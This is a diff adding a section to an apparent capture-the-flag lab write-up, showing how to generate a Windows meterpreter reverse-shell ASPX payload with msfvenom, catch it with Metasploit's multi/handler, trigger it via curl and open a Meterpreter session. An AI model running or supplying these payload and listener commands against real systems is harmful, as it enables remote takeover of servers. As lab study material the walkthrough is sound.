@@ -84,3 +84,43 @@ RHOSTS => 10.10.11.3
 ```
 
 Then to run the exploit, you can use the `run`
+
+## Reverse Shell
+
+If we can upload a file to the target machine, we can upload a reverse shell.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.9 LPORT=4444 -f aspx > devel.aspx
+```
+
+Then we can use the `exploit/multi/handler` module to listen for the incoming connection.
+
+```bash
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST MACHINE_IP
+set LPORT 4444
+run
+```
+
+Then we can navigate to the `devel.aspx` file on the target machine to get a reverse shell.
+
+```bash
+curl http://10.10.10.5/devel.aspx
+```
+
+And now in the metaexploit console we should see the following:
+
+```bash
+[*] Sending stage (175174 bytes) to
+[*] Meterpreter session 1 opened
+
+meterpreter > sessions -i 1
+```
+
+## Meterpreter
+
+Once we have a reverse shell, we can use the Meterpreter shell to interact with the target machine. We can use the following commands to interact with the Meterpreter shell:
+
+- `sysinfo`: Get system information
+- `getuid`: Get the user that the process is running as
